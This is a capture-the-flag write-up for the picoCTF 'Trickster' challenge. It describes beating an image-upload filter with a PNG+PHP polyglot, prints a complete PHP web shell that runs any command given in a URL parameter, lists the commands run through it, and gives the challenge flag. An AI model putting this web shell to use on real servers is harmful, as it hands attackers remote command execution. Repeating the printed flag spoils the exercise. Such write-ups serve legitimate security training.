### 🧠 Challenge: Trickster

We found a `robots.txt` file:

```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

---

### 🔍 instructions.txt:

```
Let's create a web app for PNG Images processing.
It needs to:
- Allow users to upload PNG images
- look for ".png" extension in the submitted files
- make sure the magic bytes match (first bytes must be "50 4E 47" in hex)
After validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

---

### 🧪 Approach

The web app validates:
- Extension `.png`
- Magic bytes for PNG (`\x89PNG\r\n\x1a\n`)

So we can **bypass** this by making a **PNG + PHP polyglot** — keep PNG magic bytes and add PHP code afterwards.

---

### 📄 Payload (shell.png.php):

```php
�PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

Uploaded this file as:  
**`shell.png.php`**

---

### 🚀 Exploitation

Visit:
```
http://atlas.picoctf.net:62866/uploads/shell.png.php
```

Run the command:
```
ls
ls ../
cat ../*.txt
```

---

### 🎯 Result

It returned:
```
/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e} */
```

---

### 🏁 Flag

```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}
```
